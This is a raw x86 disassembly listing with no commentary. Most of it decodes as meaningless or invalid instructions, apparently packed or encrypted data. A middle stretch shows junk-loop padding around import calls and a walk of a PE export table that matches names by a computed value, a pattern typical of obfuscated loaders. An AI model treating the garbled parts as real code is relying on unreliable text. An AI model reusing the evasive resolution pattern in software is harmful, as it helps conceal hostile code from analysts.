  40cb7f:	xchg   esi,eax
  40cb80:	hlt    
  40cb81:	pop    DWORD PTR [eax+0x78b62e4e]
  40cb87:	or     al,0x9c
  40cb89:	sub    eax,DWORD PTR [esi]
  40cb8b:	mov    ecx,esp
  40cb8d:	arpl   WORD PTR [edi+esi*4],ax
  40cb90:	rcr    bh,1
  40cb92:	push   0x67d98753
  40cb97:	outs   dx,DWORD PTR ds:[esi]
  40cb98:	hlt    
  40cb99:	lds    ebp,FWORD PTR [esi-0x67606ea6]
  40cb9f:	jno    0x40cb64
  40cba1:	lods   eax,DWORD PTR ds:[esi]
  40cba2:	mov    ax,WORD PTR [ebx]
  40cba5:	cwde   
  40cba6:	aam    0x1f
  40cba8:	outs   dx,BYTE PTR ds:[esi]
  40cba9:	imul   esp,eax,0x83093424
  40cbaf:	push   0x859a3ff9
  40cbb4:	std    
  40cbb5:	mov    BYTE PTR [edx],ch
  40cbb7:	add    esi,edi
  40cbb9:	pusha  
  40cbba:	pop    ecx
  40cbbb:	popa   
  40cbbc:	sbb    eax,0x9776cc06
  40cbc1:	jmp    0x96177448
  40cbc6:	jle    0x40cc15
  40cbc8:	mov    ds:0x9750f36b,eax
  40cbcd:	dec    esi
  40cbce:	lea    ebx,[edx]
  40cbd0:	(bad)  
  40cbd1:	adc    edx,DWORD PTR [edx+0x12]
  40cbd4:	mov    esp,0xcd49ec74
  40cbd9:	xchg   esp,eax
  40cbda:	nop
  40cbdb:	jno    0x40cb7b
  40cbdd:	dec    esi
  40cbde:	jbe    0x40cc05
  40cbe0:	shr    BYTE PTR [edi+0x32ff676b],0x28
  40cbe7:	std    
  40cbe8:	retf   0x574a
  40cbeb:	push   esp
  40cbec:	rol    BYTE PTR [edi+0x31],1
  40cbef:	fs pop edi
  40cbf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbf2:	xor    DWORD PTR [esi+0x17],ebp
  40cbf5:	stc    
  40cbf6:	xchg   ecx,eax
  40cbf7:	aaa    
  40cbf8:	sbb    al,0x46
  40cbfa:	sub    ah,bh
  40cbfc:	hlt    
  40cbfd:	rcr    ecx,1
  40cbff:	xchg   esp,eax
  40cc00:	dec    ecx
  40cc01:	mov    ebx,?
  40cc03:	push   esp
  40cc04:	xchg   ecx,eax
  40cc05:	add    DWORD PTR [edx-0x7a],edx
  40cc08:	js     0x40cbd8
  40cc0a:	and    edi,DWORD PTR [edi+edx*4+0x13d3904f]
  40cc11:	xchg   esi,eax
  40cc12:	xor    eax,0x8d2a7304
  40cc17:	mov    edx,0xdab27b3a
  40cc1c:	sbb    BYTE PTR [edx+0x79287dd2],dh
  40cc22:	mov    ah,0x2
  40cc24:	shl    BYTE PTR [esi+ecx*2],1
  40cc27:	or     ecx,DWORD PTR [ecx+0x6c]
  40cc2a:	add    al,BYTE PTR [edi]
  40cc2c:	jnp    0x40cbe4
  40cc2e:	imul   esp,DWORD PTR [eax],0x69ea7412
  40cc34:	xchg   esi,eax
  40cc35:	fdiv   st(0),st
  40cc37:	lahf   
  40cc38:	fidivr WORD PTR [edx-0x80]
  40cc3b:	in     al,dx
  40cc3c:	out    dx,al
  40cc3d:	gs mov ebx,0x8abee3de
  40cc43:	inc    esp
  40cc44:	pop    ss
  40cc45:	(bad)  
  40cc46:	ja     0x40cc29
  40cc48:	loop   0x40cc62
  40cc4a:	(bad)  
  40cc4c:	aaa    
  40cc4d:	inc    esp
  40cc4e:	add    bh,BYTE PTR [esi+esi*4-0xf]
  40cc52:	mov    al,ds:0x50ed331a
  40cc57:	push   ss
  40cc58:	aam    0xd9
  40cc5a:	outs   dx,DWORD PTR ds:[esi]
  40cc5b:	mov    ds:0xdce7abcf,eax
  40cc60:	jmp    0x978c:0xc37fb70c
  40cc67:	xlat   BYTE PTR ds:[ebx]
  40cc68:	arpl   WORD PTR [esi+0x26],di
  40cc6b:	mov    ebp,DWORD PTR ds:0x26174c7
  40cc71:	and    al,BYTE PTR ds:[ecx+ecx*1+0x684dfb44]
  40cc79:	sbb    eax,0xb62d477e
  40cc7e:	fdiv   DWORD PTR [ebx+ebx*2-0x6d]
  40cc82:	push   eax
  40cc83:	and    ebx,DWORD PTR [eax+0x53]
  40cc86:	ins    BYTE PTR es:[edi],dx
  40cc87:	pop    esi
  40cc88:	or     DWORD PTR [ebp+0x7c],ebx
  40cc8b:	xchg   DWORD PTR [edx-0x52],ebx
  40cc8e:	push   0xe6ff44ea
  40cc93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc94:	aad    0x96
  40cc96:	jmp    0x40cc57
  40cc98:	out    0x4c,al
  40cc9a:	aas    
  40cc9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc9c:	add    DWORD PTR [ebp+0x7],ebx
  40cc9f:	or     al,0x95
  40cca1:	in     eax,dx
  40cca2:	xor    DWORD PTR [ebx],eax
  40cca4:	rcr    BYTE PTR [ebx+ebx*8+0x63ae2a10],0x7e
  40ccac:	or     eax,DWORD PTR [ecx-0x46]
  40ccaf:	pop    ss
  40ccb0:	in     al,0x12
  40ccb2:	int    0xfe
  40ccb4:	sub    ecx,DWORD PTR [edx+0x59]
  40ccb7:	push   es
  40ccb8:	cmc    
  40ccb9:	mov    dl,0x8
  40ccbb:	lods   eax,DWORD PTR ds:[esi]
  40ccbc:	fidiv  WORD PTR [ebx+0x36]
  40ccbf:	lea    ebx,[esi-0x57c79d70]
  40ccc5:	ja     0x40cc8f
  40ccc7:	jle    0x40cd21
  40ccc9:	enter  0x69a3,0x39
  40cccd:	scas   eax,DWORD PTR es:[edi]
  40ccce:	and    bh,bh
  40ccd0:	mov    ebx,DWORD PTR [eax+0x780860bb]
  40ccd6:	inc    edi
  40ccd7:	pop    ebx
  40ccd8:	(bad)  
  40ccda:	xchg   esi,eax
  40ccdb:	xor    bh,dh
  40ccdd:	sub    DWORD PTR [esp+eax*4],ebp
  40cce0:	rcl    DWORD PTR [edi],cl
  40cce2:	fs mov ebp,0x5843cda8
  40cce8:	jge    0x40ccd3
  40ccea:	xor    BYTE PTR [ebx],ah
  40ccec:	sub    bl,0x7d
  40ccef:	cdq    
  40ccf0:	mov    ebx,0xe33b637f
  40ccf5:	into   
  40ccf6:	adc    al,0xa2
  40ccf8:	push   0xabecff87
  40ccfd:	(bad)  
  40ccfe:	ins    BYTE PTR es:[edi],dx
  40ccff:	sub    eax,0x6ff85331
  40cd04:	or     ebp,DWORD PTR [edx+0x18450461]
  40cd0a:	add    BYTE PTR [edi],ch
  40cd0c:	or     ch,BYTE PTR [edi]
  40cd0e:	(bad)  
  40cd0f:	enter  0x3c3e,0xd5
  40cd13:	push   ecx
  40cd14:	push   eax
  40cd15:	mov    eax,0xa85ade02
  40cd1a:	dec    esi
  40cd1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd1c:	repz jmp 0x3845e06b
  40cd22:	jae    0x40ccff
  40cd24:	jnp    0x40cd56
  40cd26:	and    BYTE PTR [ebp+0x70],ah
  40cd29:	xchg   esi,eax
  40cd2a:	icebp  
  40cd2b:	fisttp QWORD PTR es:[edx-0x1363c158]
  40cd32:	fisttp QWORD PTR [eax]
  40cd34:	and    ch,BYTE PTR [edi+0x28]
  40cd37:	inc    esp
  40cd38:	cwde   
  40cd39:	nop
  40cd3a:	scas   eax,DWORD PTR es:[edi]
  40cd3b:	mov    ch,0xce
  40cd3d:	(bad)  
  40cd3e:	push   edi
  40cd3f:	pop    eax
  40cd40:	sub    edx,esp
  40cd42:	push   ecx
  40cd43:	or     eax,0x3ca9f6f1
  40cd48:	pop    edi
  40cd49:	dec    ebx
  40cd4a:	fdiv   DWORD PTR [edi-0x57]
  40cd4d:	add    al,0x2c
  40cd4f:	xchg   edx,eax
  40cd50:	ror    ebx,1
  40cd52:	xchg   BYTE PTR [ecx-0x3b7af4ba],dh
  40cd58:	shl    al,cl
  40cd5a:	js     0x40cd58
  40cd5c:	cli    
  40cd5d:	dec    esi
  40cd5e:	sahf   
  40cd5f:	aas    
  40cd60:	adc    eax,0x3370d530
  40cd65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd66:	outs   dx,BYTE PTR ds:[esi]
  40cd67:	daa    
  40cd68:	adc    DWORD PTR [ecx-0x39d4cc60],0xffffffaa
  40cd6f:	hlt    
  40cd70:	cmp    DWORD PTR fs:[edi-0x4a],ecx
  40cd74:	loope  0x40cd96
  40cd76:	fwait
  40cd77:	retf   0x52bd
  40cd7a:	pop    ebx
  40cd7b:	rol    DWORD PTR [ecx],cl
  40cd7d:	shl    bh,cl
  40cd7f:	mov    al,ds:0x80d823d8
  40cd84:	mov    cl,0xa2
  40cd86:	mov    ?,WORD PTR [ebx]
  40cd88:	(bad)  
  40cd89:	jmp    0x93af:0x993b3416
  40cd90:	stc    
  40cd91:	(bad)  
  40cd92:	push   cs
  40cd93:	jmp    0x40cd7c
  40cd95:	mov    ch,0x7
  40cd97:	out    0x73,al
  40cd99:	mov    ebp,DWORD PTR [ecx+0x6772015b]
  40cd9f:	fdiv   st(3),st
  40cda1:	pop    edi
  40cda2:	hlt    
  40cda3:	call   0x16d1:0xca36dbba
  40cdaa:	cmp    eax,0xe4760fe2
  40cdaf:	xchg   ebx,eax
  40cdb0:	mov    edx,0x66fa18d0
  40cdb5:	cwde   
  40cdb6:	aas    
  40cdb7:	shl    eax,0xb3
  40cdba:	sbb    ebx,DWORD PTR [ecx]
  40cdbc:	mul    esp
  40cdbe:	stos   BYTE PTR es:[edi],al
  40cdbf:	loop   0x40ce17
  40cdc1:	push   esp
  40cdc2:	or     bl,al
  40cdc4:	dec    eax
  40cdc5:	outs   dx,DWORD PTR ds:[esi]
  40cdc6:	add    al,bh
  40cdc8:	sub    al,0xc7
  40cdca:	aas    
  40cdcb:	dec    edi
  40cdcc:	cli    
  40cdcd:	mov    esi,eax
  40cdcf:	scas   al,BYTE PTR es:[edi]
  40cdd0:	mov    bl,0xb4
  40cdd2:	add    bl,cl
  40cdd4:	dec    ebx
  40cdd5:	push   0xd54b5ab4
  40cdda:	into   
  40cddb:	into   
  40cddc:	clc    
  40cddd:	aad    0x62
  40cddf:	pop    es
  40cde0:	pop    esp
  40cde1:	xor    BYTE PTR [ecx+0x1a],0x9
  40cde5:	(bad)  
  40cde6:	fisub  DWORD PTR [edx-0x65c1732c]
  40cdec:	and    dl,BYTE PTR [edi]
  40cdee:	inc    ebx
  40cdef:	jl     0x40cd7e
  40cdf1:	mov    edx,0xe3326824
  40cdf6:	rcr    BYTE PTR [esi],1
  40cdf8:	icebp  
  40cdf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdfa:	mov    bh,0x3f
  40cdfc:	adc    dl,dl
  40cdfe:	fisub  WORD PTR [esp+edx*4-0x433ce6ab]
  40ce05:	arpl   WORD PTR [esi+0x7181976e],ax
  40ce0b:	mov    esp,0xf975b54e
  40ce10:	mov    dh,BYTE PTR [ebx+0x27595733]
  40ce16:	jbe    0x40ce26
  40ce18:	adc    eax,0x3455b759
  40ce1d:	sbb    eax,0x3035d3dc
  40ce22:	in     eax,0x5
  40ce24:	lea    edx,[edi+ecx*4-0x3f]
  40ce28:	stos   BYTE PTR es:[edi],al
  40ce29:	mov    BYTE PTR [eax+0x3d550527],bl
  40ce2f:	cmp    BYTE PTR [edi-0x71f7efcc],al
  40ce35:	call   0xf707:0x830705df
  40ce3c:	hlt    
  40ce3d:	fs call 0x881c:0xb5b325f1
  40ce45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce46:	jge    0x40ceab
  40ce48:	jp     0x40cebd
  40ce4a:	test   BYTE PTR [eax],cl
  40ce4c:	mov    esp,0xe1724c02
  40ce51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce52:	jg     0x40cea5
  40ce54:	push   ecx
  40ce55:	xchg   esp,eax
  40ce56:	aas    
  40ce57:	sub    al,0x8b
  40ce59:	push   eax
  40ce5a:	mov    eax,ds:0x24d3bf38
  40ce5f:	ins    BYTE PTR es:[edi],dx
  40ce60:	mov    cl,al
  40ce62:	jl     0x40ceda
  40ce64:	into   
  40ce65:	push   eax
  40ce66:	sub    al,0x56
  40ce68:	js     0x40ceb8
  40ce6a:	jl     0x40ce83
  40ce6c:	cli    
  40ce6d:	retf   0x811a
  40ce70:	(bad)  
  40ce71:	jne    0x40ce0f
  40ce73:	cmp    edx,edx
  40ce75:	sbb    ah,ch
  40ce77:	inc    ecx
  40ce78:	or     DWORD PTR [ecx-0x6a],esi
  40ce7b:	push   ecx
  40ce7c:	xor    eax,0x22846e64
  40ce81:	int3   
  40ce82:	popa   
  40ce83:	pushf  
  40ce84:	jmp    0x78972883
  40ce89:	add    esi,DWORD PTR [eax-0x79825259]
  40ce8f:	arpl   di,sp
  40ce91:	inc    ebx
  40ce92:	inc    edi
  40ce93:	int3   
  40ce94:	sub    BYTE PTR [ebx],cl
  40ce96:	imul   ecx,DWORD PTR [ecx+0x2a],0xffffff8b
  40ce9a:	inc    ebp
  40ce9b:	cld    
  40ce9c:	mov    DWORD PTR ds:0x428eab,0x1e
  40cea6:	cmp    DWORD PTR ds:0x428eab,0x0
  40cead:	je     0x40cee0
  40ceb3:	cmp    DWORD PTR ds:0x428eab,0x2d
  40ceba:	ja     0x40cee0
  40cec0:	jmp    0x40cece
  40cec5:	push   DWORD PTR [ebp-0x24]
  40cec8:	call   DWORD PTR ds:0x42aa03
  40cece:	mov    ebx,DWORD PTR ds:0x428eab
  40ced4:	dec    ebx
  40ced5:	mov    DWORD PTR ds:0x428eab,ebx
  40cedb:	jmp    0x40cea6
  40cee0:	xor    eax,esi
  40cee2:	add    eax,edi
  40cee4:	or     ebx,0x4a81
  40ceea:	mov    DWORD PTR [ebp-0x30],eax
  40ceed:	mov    ebx,DWORD PTR [ebp-0x4]
  40cef0:	or     eax,DWORD PTR ds:0x428e7b
  40cef6:	xor    ebx,esi
  40cef8:	and    DWORD PTR ds:0x428e6b,0x0
  40cf02:	jmp    0x40cf12
  40cf07:	mov    eax,ds:0x428e6b
  40cf0c:	inc    eax
  40cf0d:	mov    ds:0x428e6b,eax
  40cf12:	cmp    DWORD PTR ds:0x428e6b,0x19
  40cf19:	jae    0x40cf59
  40cf1f:	cmp    DWORD PTR ds:0x428e6b,0x8
  40cf26:	jl     0x40cf59
  40cf2c:	jmp    0x40cf3c
  40cf31:	push   0x428189
  40cf36:	call   DWORD PTR ds:0x42aa0b
  40cf3c:	cmp    DWORD PTR ds:0x428e6b,0x7
  40cf43:	jne    0x40cf54
  40cf49:	mov    eax,ds:0x428e6b
  40cf4e:	inc    eax
  40cf4f:	mov    ds:0x428e6b,eax
  40cf54:	jmp    0x40cf07
  40cf59:	add    ebx,edi
  40cf5b:	sub    DWORD PTR ds:0x428e8b,ebx
  40cf61:	mov    eax,DWORD PTR [ebp-0x24]
  40cf64:	xor    DWORD PTR ds:0x428ebb,0x518c
  40cf6e:	sub    eax,edi
  40cf70:	lea    ecx,[ebx-0x3272f6]
  40cf76:	xor    eax,esi
  40cf78:	xor    DWORD PTR ds:0x428e67,0x744d
  40cf82:	xor    ecx,esi
  40cf84:	mov    DWORD PTR ds:0x428eb3,0x57aa
  40cf8e:	cmp    ecx,eax
  40cf90:	mov    DWORD PTR ds:0x428e8f,0x2448
  40cf9a:	je     0x40d1fa
  40cfa0:	mov    eax,ds:0x428ebb
  40cfa5:	and    DWORD PTR ds:0x428e2f,eax
  40cfab:	mov    eax,DWORD PTR [ebp-0x4]
  40cfae:	neg    DWORD PTR ds:0x428e73
  40cfb4:	xor    eax,esi
  40cfb6:	inc    DWORD PTR ds:0x428e43
  40cfbc:	add    eax,edi
  40cfbe:	mov    DWORD PTR ds:0x428eab,0x7b11
  40cfc8:	cmp    ebx,eax
  40cfca:	jne    0x40d1d7
  40cfd0:	xor    DWORD PTR ds:0x428e37,0x428e63
  40cfda:	push   DWORD PTR [ebp+0x8]
  40cfdd:	xor    DWORD PTR ds:0x428e83,0x428eaf
  40cfe7:	call   0x421aa4
  40cfec:	or     ecx,DWORD PTR ds:0x428ecb
  40cff2:	mov    DWORD PTR [ebp-0x14],eax
  40cff5:	mov    eax,DWORD PTR [ebp-0x4]
  40cff8:	and    DWORD PTR ds:0x428e97,0x0
  40d002:	mov    ecx,DWORD PTR ds:0x428e97
  40d008:	inc    ecx
  40d009:	mov    DWORD PTR ds:0x428e97,ecx
  40d00f:	cmp    DWORD PTR ds:0x428e97,0x8
  40d016:	jg     0x40d055
  40d01c:	jmp    0x40d02c
  40d021:	push   0x2d20
  40d026:	call   DWORD PTR ds:0x42aa0f
  40d02c:	cmp    DWORD PTR ds:0x428e97,0x7
  40d033:	jne    0x40d048
  40d039:	xor    ecx,ecx
  40d03b:	xor    ecx,DWORD PTR ds:0x428e97
  40d041:	inc    ecx
  40d042:	mov    DWORD PTR ds:0x428e97,ecx
  40d048:	cmp    DWORD PTR ds:0x428e97,0x16
  40d04f:	jb     0x40d002
  40d055:	mov    ecx,DWORD PTR [ebp-0x14]
  40d058:	xor    eax,esi
  40d05a:	sbb    DWORD PTR ds:0x428e33,0x7710
  40d064:	add    eax,edi
  40d066:	cmp    ecx,eax
  40d068:	mov    DWORD PTR ds:0x428e93,0x6f23
  40d072:	je     0x40f614
  40d078:	push   DWORD PTR [ebp-0x14]
  40d07b:	xor    DWORD PTR ds:0x428e33,0x5f29
  40d085:	push   DWORD PTR [ebp+0x8]
  40d088:	call   0x423e95
  40d08d:	mov    DWORD PTR [ebp-0x14],eax
  40d090:	mov    eax,DWORD PTR [ebp-0x4]
  40d093:	mov    ecx,DWORD PTR ds:0x428e93
  40d099:	and    DWORD PTR ds:0x428e8b,ecx
  40d09f:	mov    ecx,DWORD PTR [ebp-0x14]
  40d0a2:	neg    DWORD PTR ds:0x428e6b
  40d0a8:	xor    eax,esi
  40d0aa:	sub    DWORD PTR ds:0x428e8b,0x59e8
  40d0b4:	add    eax,edi
  40d0b6:	cmp    ecx,eax
  40d0b8:	je     0x40f614
  40d0be:	and    DWORD PTR ds:0x428e63,0x0
  40d0c8:	jmp    0x40d0da
  40d0cd:	mov    ecx,DWORD PTR ds:0x428e63
  40d0d3:	inc    ecx
  40d0d4:	mov    DWORD PTR ds:0x428e63,ecx
  40d0da:	cmp    DWORD PTR ds:0x428e63,0x14
  40d0e1:	jae    0x40d123
  40d0e7:	cmp    DWORD PTR ds:0x428e63,0xb
  40d0ee:	jbe    0x40d123
  40d0f4:	jmp    0x40d104
  40d0f9:	push   0x4280f7
  40d0fe:	call   DWORD PTR ds:0x42aa13
  40d104:	cmp    DWORD PTR ds:0x428e63,0xa
  40d10b:	jne    0x40d11e
  40d111:	mov    ecx,DWORD PTR ds:0x428e63
  40d117:	inc    ecx
  40d118:	mov    DWORD PTR ds:0x428e63,ecx
  40d11e:	jmp    0x40d0cd
  40d123:	mov    eax,DWORD PTR [ebp-0x14]
  40d126:	mov    eax,DWORD PTR [eax+0x18]
  40d129:	mov    DWORD PTR [ebp-0x24],eax
  40d12c:	or     ecx,0x560
  40d132:	mov    eax,DWORD PTR [ebp-0x14]
  40d135:	adc    ecx,DWORD PTR ds:0x428e9f
  40d13b:	mov    ecx,DWORD PTR [ebp+0x8]
  40d13e:	add    ecx,DWORD PTR [eax+0x20]
  40d141:	xor    eax,eax
  40d143:	xor    eax,DWORD PTR ds:0x428e7b
  40d149:	sbb    eax,DWORD PTR ds:0x428e67
  40d14f:	mov    ds:0x428e7b,eax
  40d154:	mov    DWORD PTR [ebp-0x2c],ecx
  40d157:	dec    ecx
  40d158:	mov    eax,DWORD PTR [ebp-0x14]
  40d15b:	add    ecx,0x1e8d
  40d161:	mov    ecx,DWORD PTR [ebp+0x8]
  40d164:	add    ecx,DWORD PTR [eax+0x24]
  40d167:	and    DWORD PTR ds:0x428e3b,0x0
  40d171:	mov    eax,ds:0x428e3b
  40d176:	inc    eax
  40d177:	mov    ds:0x428e3b,eax
  40d17c:	cmp    DWORD PTR ds:0x428e3b,0x2c
  40d183:	ja     0x40d1a4
  40d189:	jmp    0x40d197
  40d18e:	push   DWORD PTR [ebp-0x14]
  40d191:	call   DWORD PTR ds:0x42aa17
  40d197:	cmp    DWORD PTR ds:0x428e3b,0x1f
  40d19e:	jb     0x40d171
  40d1a4:	mov    DWORD PTR [ebp-0x34],ecx
  40d1a7:	mov    eax,ds:0x428e3b
  40d1ac:	and    DWORD PTR ds:0x428e87,eax
  40d1b2:	mov    eax,DWORD PTR [ebp-0x14]
  40d1b5:	xor    DWORD PTR ds:0x428e73,0x264d
  40d1bf:	mov    ecx,DWORD PTR [ebp+0x8]
  40d1c2:	add    ecx,DWORD PTR [eax+0x1c]
  40d1c5:	mov    DWORD PTR ds:0x428e57,0x2595
  40d1cf:	mov    DWORD PTR [ebp-0x14],ecx
  40d1d2:	jmp    0x40f5dc
  40d1d7:	mov    eax,DWORD PTR [ebp-0x2c]
  40d1da:	mov    ecx,DWORD PTR [ebp+0x8]
  40d1dd:	add    ecx,DWORD PTR [eax+ebx*4]
  40d1e0:	mov    DWORD PTR [ebp-0x28],ecx
  40d1e3:	mov    eax,DWORD PTR [ebp-0x4]
  40d1e6:	mov    ecx,DWORD PTR [ebp-0x28]
  40d1e9:	xor    eax,esi
  40d1eb:	add    eax,edi
  40d1ed:	cmp    ecx,eax
  40d1ef:	je     0x40f5dc
  40d1f5:	jmp    0x40f5cd
  40d1fa:	mov    eax,DWORD PTR [ebp-0x4]
  40d1fd:	mov    ecx,DWORD PTR [ebp-0x8]
  40d200:	xor    eax,esi
  40d202:	add    eax,edi
  40d204:	jmp    0x40f5b3
  40d209:	jns    0x40d251
  40d20b:	mov    esp,0x14898cd9
  40d210:	(bad)  
  40d211:	mov    es,WORD PTR [eax+0x15e81153]
  40d217:	rol    BYTE PTR [ebp+0x55],0xd2
  40d21b:	add    DWORD PTR [ebx-0x7c7c9f0f],0xffffff9a
  40d222:	xchg   edi,eax
  40d223:	shl    DWORD PTR [ebp+0x406d593d],1
  40d229:	mov    ebx,0xf87a4318
  40d22e:	push   edx
  40d22f:	out    dx,eax
  40d230:	jb     0x40d262
  40d232:	push   esi
  40d233:	pop    edi
  40d234:	sbb    eax,0xda78df26
  40d239:	mov    edi,0x9fd7387d
  40d23e:	inc    eax
  40d23f:	push   ebp
  40d240:	mov    ah,BYTE PTR [ecx+0xb]
  40d243:	inc    edi
  40d244:	cld    
  40d245:	shr    DWORD PTR [edi+0x18d241b9],0x6d
  40d24c:	adc    al,0xa3
  40d24e:	test   DWORD PTR [edi+0x47173341],edx
  40d254:	sbb    dh,BYTE PTR [edx]
  40d256:	xchg   BYTE PTR [edi-0x4f1017b9],cl
  40d25c:	xchg   esp,eax
  40d25d:	mov    eax,ds:0x416cb5f
  40d262:	(bad)  
  40d263:	adc    BYTE PTR [ebp-0x1f],bl
  40d266:	jne    0x40d234
  40d268:	mov    es,WORD PTR [edi-0x61]
  40d26b:	out    0x39,al
  40d26d:	mov    DWORD PTR [ecx-0x41279df5],esi
  40d273:	adc    al,BYTE PTR [eax-0x1d67cd28]
  40d279:	addr16 mov esp,0x43f03356
  40d27f:	dec    edx
  40d280:	ror    BYTE PTR [ebx+eiz*1],0x92
  40d284:	xor    al,0x7f
  40d286:	mov    ebp,0x140d5da9
  40d28b:	sbb    DWORD PTR [ecx+esi*8+0x1d],ecx
  40d28f:	sbb    esp,DWORD PTR [edx+0x7]
  40d292:	(bad)  
  40d294:	lods   eax,DWORD PTR ds:[esi]
  40d295:	and    dl,BYTE PTR [edx]
  40d297:	daa    
  40d298:	sbb    eax,0x5caf7ec3
  40d29d:	dec    ebx
  40d29e:	xchg   edi,eax
  40d29f:	adc    bh,BYTE PTR [edi+0x5033f104]
  40d2a5:	enter  0x260e,0x1b
  40d2a9:	dec    ecx
  40d2aa:	das    
  40d2ab:	fucomip st,st(7)
  40d2ad:	es dec ebx
  40d2af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2b0:	dec    ebp
  40d2b1:	sub    edx,ebp
  40d2b3:	mov    ebx,0xc47591de
  40d2b8:	loop   0x40d28f
  40d2ba:	and    DWORD PTR [esi+0x6b],ebp
  40d2bd:	out    dx,al
  40d2be:	das    
  40d2bf:	or     BYTE PTR [edx+edx*2+0x4563aee],dl
  40d2c6:	mov    ah,0xf8
  40d2c8:	cmp    al,0x1e
  40d2ca:	rcr    eax,cl
  40d2cc:	ror    BYTE PTR [ecx],cl
  40d2ce:	daa    
  40d2cf:	mov    ebp,0x593bab89
  40d2d4:	adc    DWORD PTR [ebx-0x53ae47fc],esi
  40d2da:	popf   
  40d2db:	outs   dx,DWORD PTR ds:[esi]
  40d2dc:	jb     0x40d327
  40d2de:	mov    bl,0xb9
  40d2e0:	sub    eax,edi
  40d2e2:	mov    ch,BYTE PTR [eax-0x2c40c023]
  40d2e8:	jg     0x40d353
  40d2ea:	sbb    edx,edi
  40d2ec:	jge    0x40d2d6
  40d2ee:	pop    esp
  40d2ef:	and    DWORD PTR [eax],0x1cff1195
  40d2f5:	push   edi
  40d2f6:	jmp    ecx
  40d2f8:	adc    dh,dl
  40d2fa:	sub    al,0x4a
  40d2fc:	push   0xc9a38ade
  40d301:	(bad)  
  40d302:	test   al,0x14
  40d304:	scas   al,BYTE PTR es:[edi]
  40d305:	rcr    cl,0x44
  40d308:	push   ds
  40d309:	inc    ebx
  40d30a:	mov    edi,0xd354fc04
  40d30f:	mov    ss,WORD PTR [edi+0x186ffe1e]
  40d315:	xchg   edx,eax
  40d316:	lock stc 
  40d318:	test   DWORD PTR [ebx],ebx
  40d31a:	mov    ebx,0x7d1c6c1c
  40d31f:	jmp    0x40d312
  40d321:	inc    ecx
  40d322:	pop    edi
  40d323:	(bad)  
  40d324:	mov    cl,0x1a
  40d326:	fimul  WORD PTR [edx+0x6]
  40d329:	das    
  40d32a:	lock cdq 
  40d32c:	mov    DWORD PTR ds:0x61f2b09,esp
  40d332:	out    dx,al
  40d333:	(bad)  
  40d334:	mov    ebp,0xa8e7d2f0
  40d339:	and    al,0x17
  40d33b:	mov    eax,ds:0x8795aaa9
  40d340:	scas   al,BYTE PTR es:[edi]
  40d341:	(bad)  
  40d342:	pop    esi
  40d343:	mov    dh,0xc6
  40d345:	sub    al,0x17
  40d347:	ret    0x44e
  40d34a:	outs   dx,DWORD PTR ds:[esi]
  40d34b:	xchg   esp,eax
  40d34c:	aam    0x4b
  40d34e:	mov    ebp,0x7985e31b
  40d353:	fidiv  DWORD PTR [edx-0x6ff79221]
  40d359:	clc    
  40d35a:	(bad)  
  40d35b:	jno    0x40d324
  40d35d:	je     0x40d31b
  40d35f:	pop    edi
  40d360:	shr    DWORD PTR [ebx],1
  40d362:	mov    ecx,0xb9e5bdc7
  40d367:	imul   eax,DWORD PTR [ecx+0x73783357],0x67
  40d36e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d36f:	adc    esp,ecx
  40d371:	pop    esi
  40d372:	adc    eax,0xea1efab8
  40d377:	mov    eax,0x681e404b
  40d37c:	stos   DWORD PTR es:[edi],eax
  40d37d:	call   0xb555:0x7ce52d73
  40d384:	imul   edx,DWORD PTR [ecx+ecx*4],0xffffffe0
  40d388:	add    edx,DWORD PTR gs:[edx]
  40d38b:	push   edx
  40d38c:	push   es
  40d38d:	shl    DWORD PTR [esi-0x67140917],1
  40d393:	mov    edi,0x8d749245
  40d398:	mov    bh,0x62
  40d39a:	not    cl
  40d39c:	jb     0x40d3ee
  40d39e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d39f:	fist   WORD PTR [ebp+edi*8-0x7]
  40d3a3:	ss adc al,0x1e
  40d3a6:	nop
  40d3a7:	mov    ecx,DWORD PTR [ebp+ebp*2+0x6b57990b]
  40d3ae:	sub    bh,BYTE PTR [eax+0x5c]
  40d3b1:	iret   
  40d3b2:	jb     0x40d40b
  40d3b4:	adc    dh,0x45
  40d3b7:	repnz dec ebx
  40d3b9:	pop    edx
  40d3ba:	fld    TBYTE PTR [ebx]
  40d3bc:	pop    ebx
  40d3bd:	add    eax,0x54398065
  40d3c2:	xlat   BYTE PTR ds:[ebx]
  40d3c3:	pop    edx
  40d3c4:	leave  
  40d3c5:	fisttp QWORD PTR [ecx+0x766d07d2]
  40d3cb:	jg     0x40d42a
  40d3cd:	test   BYTE PTR [eax+0x1a],dh
  40d3d0:	stc    
  40d3d1:	ins    DWORD PTR es:[edi],dx
  40d3d2:	xchg   edi,eax
  40d3d3:	ss jo  0x40d394
  40d3d6:	lea    esi,[esi+ebx*4-0x25]
  40d3da:	pushf  
  40d3db:	cmp    eax,0xac718f12
  40d3e0:	mov    ebx,DWORD PTR [eax+0x1099101a]
  40d3e6:	or     edx,ecx
  40d3e8:	pop    es
  40d3e9:	imul   eax,DWORD PTR [eax],0xffffffd0
  40d3ec:	imul   esi,DWORD PTR [eax],0x7e
  40d3ef:	cld    
  40d3f0:	sub    bl,dh
  40d3f2:	push   eax
  40d3f3:	pop    es
  40d3f4:	(bad)  
  40d3f5:	arpl   WORD PTR [edi-0x56],sp
  40d3f8:	mov    ch,BYTE PTR ds:0x1da194e
  40d3fe:	add    BYTE PTR [ebx-0x4578d3d9],bl
  40d404:	das    
  40d405:	cmp    BYTE PTR [esi],0xa6
  40d408:	push   eax
  40d409:	sub    al,0x91
  40d40b:	mov    ah,0x8
  40d40d:	add    al,0xa8
  40d40f:	mov    eax,ds:0x5b99ad36
  40d414:	cmp    eax,0xe25963bd
  40d419:	das    
  40d41a:	arpl   WORD PTR [ecx+0x318c6100],si
  40d420:	cmp    DWORD PTR [ecx-0x2e56566b],edi
  40d426:	inc    edi
  40d427:	mov    bh,0xce
